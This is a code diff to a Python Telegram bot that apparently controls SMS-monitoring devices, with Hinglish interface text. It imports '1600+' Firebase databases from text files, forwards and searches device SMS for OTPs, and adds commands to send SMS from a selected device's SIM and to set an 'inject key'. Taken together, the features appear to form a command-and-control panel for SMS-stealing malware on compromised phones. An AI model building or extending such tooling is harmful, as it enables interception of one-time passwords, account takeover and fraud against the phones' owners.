@@ -1,4 +1,5 @@
 import logging
+import time
 from datetime import datetime, timezone
 
 from sqlalchemy.orm import Session
@@ -8,13 +9,18 @@ from telegram.ext import Application, CallbackQueryHandler, CommandHandler, Cont
 from app.config import get_settings
 from app.database import Device, MonitorProfile, SMSMessage, SessionLocal
 from app.bulk_firebase import bulk_import_from_txt
-from app.channel_relay import get_profile_by_channel, queue_channel_sms
+from app.channel_relay import get_profile_by_channel, queue_channel_sms, queue_manual_sms
 from app.device_ui import (
     device_set_keyboard,
     format_addchannel_card,
     format_device_set_card,
     format_firebase_connected_card,
+    format_key_set_card,
     format_monitoring_card,
+    format_ping_card,
+    format_send_queued,
+    format_status_card,
+    format_welcome_message,
     get_sim_list,
     monitoring_keyboard,
 )
@@ -25,9 +31,11 @@ from app.services import (
     get_monitoring_user_ids,
     register_device,
     get_monitor_profile,
+    resume_monitoring,
     select_sim_slot,
     connect_firebase_url,
     set_channel_id,
+    set_inject_key,
     show_device_by_id,
     set_user_phone,
     start_monitoring,
@@ -114,55 +122,14 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         await update.message.reply_text("❌ Unauthorized. Contact admin.")
         return
 
-    await update.message.reply_text(
-        "👋 *SMS Monitor Bot*\n\n"
-        "Commands:\n"
-        "/mynum <number> - Apna number set karo\n"
-        "/addchannel <id> - Channel connect + auto SMS send\n"
-        "/startmonitar - SMS forwarding start\n"
-        "/stopmonitar - SMS forwarding stop\n"
-        "/setfirebase <url> - Firebase connect karo\n"
-        "/setdevice <id> - Device select karo\n"
-        "/allfirebase - Txt file se 1600+ Firebase import\n"
-        "/a <deviceid> - Apni device add/claim karo\n"
-        "/devices - Apni saari devices dekho\n"
-        "/device <name> - Ek device ke SMS dekho\n"
-        "/adddevice <name> - Nayi device add karo\n"
-        "/recent - Last 10 SMS\n"
-        "/search <keyword> - Search messages\n"
-        "/stats - Total SMS count\n"
-        "/help - Show help",
-        parse_mode="Markdown",
-    )
+    await update.message.reply_text(format_welcome_message(), parse_mode="HTML")
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_authorized(update.effective_user.id if update.effective_user else None):
         return
 
-    await update.message.reply_text(
-        "📖 *Help*\n\n"
-        "Apna database `.env` mein `DATABASE_URL` se connect karo.\n"
-        "Device SMS bhejti hai to automatically bot mein aa jati hai.\n\n"
-        "*Monitor commands:*\n"
-        "/mynum 9876543210 - Apna SIM number set karo\n"
-        "/startmonitar - Is number ke saare SMS forward\n"
-        "/stopmonitar - Forwarding band karo\n\n"
-        "*Firebase:*\n"
-        "/setfirebase https://project.firebaseio.com\n"
-        "/allfirebase - txt file bhejo bulk import ke liye\n"
-        "/a deviceid - sirf woh ek device dikhao\n\n"
-        "*Device commands:*\n"
-        "/a myphone - Apni device add/claim karo\n"
-        "/devices - Meri devices list\n"
-        "/device redmi - Us device ke recent SMS\n"
-        "/adddevice samsung - Manual device add\n\n"
-        "*SMS commands:*\n"
-        "/recent - Last 10 SMS\n"
-        "/search otp - OTP dhundho\n"
-        "/stats - Statistics",
-        parse_mode="Markdown",
-    )
+    await update.message.reply_text(format_welcome_message(), parse_mode="HTML")
 
 
 async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -236,17 +203,19 @@ async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if not is_authorized(user.id if user else None):
         return
 
-    if not context.args:
+    if context.args:
+        channel_id = context.args[0]
+    elif update.effective_chat and update.effective_chat.type in ("channel", "group", "supergroup"):
+        channel_id = str(update.effective_chat.id)
+    else:
         await update.message.reply_text(
             "Usage: `/addchannel <channel-id>`\n\n"
             "Example:\n"
             "`/addchannel -1003553669855`\n\n"
-            "Bot ko channel mein admin banao!",
+            "Ya group/channel mein command bhejo — auto detect hoga.",
             parse_mode="Markdown",
         )
         return
-
-    channel_id = context.args[0]
     db: Session = SessionLocal()
     try:
         profile = set_channel_id(db, user.id, channel_id)
@@ -322,8 +291,13 @@ async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         db.close()
 
     await update.message.reply_text(
-        f"🔴 Monitoring stopped for `+{profile.phone_number or 'unknown'}`",
-        parse_mode="Markdown",
+        "🔴 <b>STOPPED</b>\n\n"
+        "<pre>"
+        "Monitor paused.\n\n"
+        f"📞 Number: {profile.phone_number or 'unknown'}\n"
+        "Use /resume to start again."
+        "</pre>",
+        parse_mode="HTML",
     )
 
 
@@ -441,6 +415,43 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
 
 
+async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Shared handler for /a /setdevice /fy /fb <device_id>"""
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if not context.args:
+        cmd = (update.message.text or "").split()[0]
+        await update.message.reply_text(
+            f"Usage: `{cmd} <device_id>`\n\n"
+            "Example:\n"
+            f"`{cmd} cac2ced675392f6c`",
+            parse_mode="Markdown",
+        )
+        return
+
+    deviceid = context.args[0]
+    db: Session = SessionLocal()
+    try:
+        device, profile = await show_device_by_id(db, deviceid, user.id)
+    except LookupError:
+        await update.message.reply_text(
+            f"❌ Device `{deviceid}` nahi mili.\n"
+            f"Pehle `/setfirebase` ya `/allfirebase` use karo.",
+            parse_mode="Markdown",
+        )
+        return
+    except Exception as exc:
+        logger.error("Device lookup failed: %s", exc)
+        await update.message.reply_text(f"❌ Error: {exc}")
+        return
+    finally:
+        db.close()
+
+    await send_device_set_ui(update.message, device, profile)
+
+
 async def send_device_set_ui(message, device: Device, profile: MonitorProfile | None = None) -> None:
     sim_index = profile.selected_sim_index if profile else 0
     await message.reply_text(
@@ -466,32 +477,134 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         finally:
             db.close()
 
-        await update.message.reply_text(
-            "Usage: `/a <deviceid>`\n\n"
-            "Example: `/a cac2ced675392f6c`",
-            parse_mode="Markdown",
-        )
+    await device_select_command(update, context)
+
+
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await stopmonitar_command(update, context)
+
+
+async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
         return
 
-    deviceid = context.args[0]
     db: Session = SessionLocal()
     try:
-        device, profile = await show_device_by_id(db, deviceid, user.id)
-    except LookupError:
-        await update.message.reply_text(
-            f"❌ Device `{deviceid}` nahi mili.\n"
-            f"Pehle `/allfirebase` se txt import karo.",
-            parse_mode="Markdown",
-        )
-        return
-    except Exception as exc:
-        logger.error("Device lookup failed: %s", exc)
-        await update.message.reply_text(f"❌ Error: {exc}")
+        profile, device = resume_monitoring(db, user.id)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
         return
     finally:
         db.close()
 
-    await send_device_set_ui(update.message, device, profile)
+    if device:
+        await update.message.reply_text(
+            format_monitoring_card(device, profile, test_message="Monitor resumed"),
+            parse_mode="HTML",
+            reply_markup=monitoring_keyboard(),
+        )
+    else:
+        await update.message.reply_text("🟢 Monitor resumed!", parse_mode="HTML")
+
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, user.id)
+        device = get_active_device(db, user.id)
+        sms_count = 0
+        if device:
+            sms_count = db.query(SMSMessage).filter(SMSMessage.device_id == device.id).count()
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        format_status_card(device, profile, sms_count),
+        parse_mode="HTML",
+    )
+
+
+async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if len(context.args) < 2:
+        await update.message.reply_text(
+            "Usage: `/send <number> <message>`\n\n"
+            "Example:\n"
+            "`/send 9876543210 Your OTP is 123`",
+            parse_mode="Markdown",
+        )
+        return
+
+    to_number = context.args[0]
+    message = " ".join(context.args[1:])
+    db: Session = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, user.id)
+        device = get_active_device(db, user.id)
+        if not profile or not device:
+            await update.message.reply_text("❌ Pehle /setdevice <id> se device select karo.")
+            return
+        outbound = queue_manual_sms(db, profile, device, to_number, message)
+        sims = get_sim_list(device)
+        sim_slot = sims[profile.selected_sim_index or 0]["slot"] if sims else outbound.sim_slot
+    except Exception as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        format_send_queued(to_number, message, sim_slot),
+        parse_mode="HTML",
+    )
+
+
+async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized(update.effective_user.id if update.effective_user else None):
+        return
+
+    start = time.perf_counter()
+    msg = await update.message.reply_text("🏓 Pinging...")
+    latency = int((time.perf_counter() - start) * 1000)
+    await msg.edit_text(format_ping_card(latency), parse_mode="HTML")
+
+
+async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: `/key KEY-XXXX-XXXX-XXXX`\n\n"
+            "Example:\n"
+            "`/key KEY-BQUB-J7LC-EWI1-RW94`",
+            parse_mode="Markdown",
+        )
+        return
+
+    inject_key = context.args[0]
+    db: Session = SessionLocal()
+    try:
+        device = set_inject_key(db, user.id, inject_key)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        format_key_set_card(device.api_key or inject_key),
+        parse_mode="HTML",
+    )
 
 
 async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -735,8 +848,16 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("allfirebase", allfirebase_command))
     app.add_handler(CommandHandler("setfirebase", setfirebase_command))
     app.add_handler(MessageHandler(filters.Document.ALL, firebase_txt_upload_handler))
+    app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CommandHandler("resume", resume_command))
+    app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("send", send_command))
+    app.add_handler(CommandHandler("ping", ping_command))
+    app.add_handler(CommandHandler("key", key_command))
+    app.add_handler(CommandHandler("fy", device_select_command))
+    app.add_handler(CommandHandler("fb", device_select_command))
     app.add_handler(CommandHandler("a", a_command))
-    app.add_handler(CommandHandler("setdevice", a_command))
+    app.add_handler(CommandHandler("setdevice", device_select_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
     app.add_handler(CommandHandler("adddevice", adddevice_command))
